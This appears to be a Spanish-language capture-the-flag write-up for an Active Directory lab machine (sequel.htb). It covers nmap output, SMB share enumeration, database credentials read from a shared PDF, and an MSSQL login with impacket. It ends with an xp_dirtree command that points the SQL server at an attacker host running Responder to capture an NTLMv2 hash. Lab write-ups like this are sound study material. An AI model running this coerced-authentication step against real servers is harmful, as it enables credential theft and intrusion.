#ActiveDirectory #medium #windows 
### Ping
```python
ping -c 1 10.10.11.202
PING 10.10.11.202 (10.10.11.202) 56(84) bytes of data.
64 bytes from 10.10.11.202: icmp_seq=1 ttl=127 time=150 ms

--- 10.10.11.202 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 149.915/149.915/149.915/0.000 ms
```

### TTL 127 = Windows

### nmap
```python
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-03-29 08:37:36Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-29T08:39:09+00:00; +7h58m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-03-29T08:39:10+00:00; +7h58m59s from scanner time.
1433/tcp  open  ms-sql-s          Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-03-29T08:39:09+00:00; +7h58m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-29T08:32:26
|_Not valid after:  2054-03-29T08:32:26
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-29T08:39:09+00:00; +7h58m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  globalcatLDAPssl?
|_ssl-date: 2024-03-29T08:39:10+00:00; +7h58m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49686/tcp open  msrpc             Microsoft Windows RPC
49725/tcp open  msrpc             Microsoft Windows RPC
51906/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h58m58s, deviation: 0s, median: 7h58m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-03-29T08:38:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.86 seconds
```

### Enumeración del puerto 53 (DOMAIN)
`dig` conseguimos una cookie que podría ser interesante
![[Pasted image 20240328204907.png]]

`dnsenum`
podemos ver lo que parece la ipv6 de la maquina
![[Pasted image 20240328205655.png]]

`Enumerating srv records`
tenemos un reconocimiento completo de kerberos y ldap lo que me hace pensar que podríamos intentar obtener un TGT mas adelante 
![[Pasted image 20240328205742.png]]

### Enumeración del puerto 88 (Kerberos)

![[Pasted image 20240328210931.png]]

### Enumeración del puerto 389 (ldap)
no obtenemos mucha información sobre el ldap
![[Pasted image 20240328214121.png]]

### Enumeración del puerto 445 (SBM)
tenemos archivos compartidos 
![[Pasted image 20240328214416.png]]

`smbmap`
smbmap nos permite ver los permisos que tenemos sobre los archivos compartidos
![[Pasted image 20240328214546.png]]

### smbmap
encontramos un directorio llamado public donde tenemos permisos de lectura y dentro tenemos un archivo pdf que podemos descargar 
![[Pasted image 20240328214912.png]]

`download`
descargamos el archivo pdf que se esta compartiendo
![[Pasted image 20240328220045.png]]

`open pdf`
el archivo pdf que conseguimos nos da información de varios usuarios y de como conectarnos a la base de datos mysql con las credenciales
![[Pasted image 20240328220348.png]]

### impacket-mssqlclient
usando `mssqlclient` de la suite de impacket podemos establecer conexión en la base de datos
![[Pasted image 20240328221851.png]]

### responder 
vamos a iniciar el responder para intentar obtener un hash. si intentamos listar los archivos y directorios en nuestra maquina y estos no existen la base de datos debería de darnos un hash
```python
EXEC MASTER.sys.xp_dirtree '\\10.10.10.10\test', 1, 1
```
![[Pasted image 20240328222914.png]]

### impacket-mssqlclient + responder
apuntamos a un recurso que no existe en nuestra maquina atacante por lo cual estaríamos envenenando la petición y de esta manera podeos capturar un hash NTLMv2.
`NOTA: este ataque es parecido a un ataque samba`
![[Pasted image 20240328224406.png]]